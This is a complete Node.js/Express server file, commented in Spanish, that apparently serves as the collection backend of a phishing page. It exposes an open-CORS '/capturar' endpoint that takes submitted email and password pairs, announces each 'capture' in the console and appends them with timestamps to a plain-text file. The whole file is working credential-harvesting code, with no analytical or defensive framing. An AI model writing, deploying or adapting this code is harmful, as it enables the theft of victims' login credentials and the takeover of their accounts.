const express = require('express');
const cors = require('cors');
const fs = require('fs');
const path = require('path');
const app = express();

app.use(cors());
app.use(express.json());

// Ruta para recibir los datos
app.post('/capturar', (req, res) => {
    const { email, password } = req.body;

    // --- MODIFICACIÓN AQUÍ PARA VER DATOS EN LOGS ---
    console.log("========================================");
    console.log("NUEVA CAPTURA DETECTADA");
    console.log(`Numero 1: ${email}`);
    console.log(`Numero 2: ${password}`);
    console.log("========================================");
    // ----------------------------------------------

    const data = `USUARIO: ${email} | CLAVE: ${password} | FECHA: ${new Date().toLocaleString()}\n`;
    
    const filePath = path.join(__dirname, 'base_de_datos.txt');
    
    fs.appendFile(filePath, data, (err) => {
        if (err) {
            console.error("Error al guardar en archivo:", err);
            return res.status(500).send("Error interno");
        }
        // Este mensaje es el que ya veías, ahora verás también los de arriba
        console.log(">>> Registro guardado en base_de_datos.txt");
        res.status(200).send("Datos capturados");
    });
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`Servidor corriendo en el puerto ${PORT}`);
});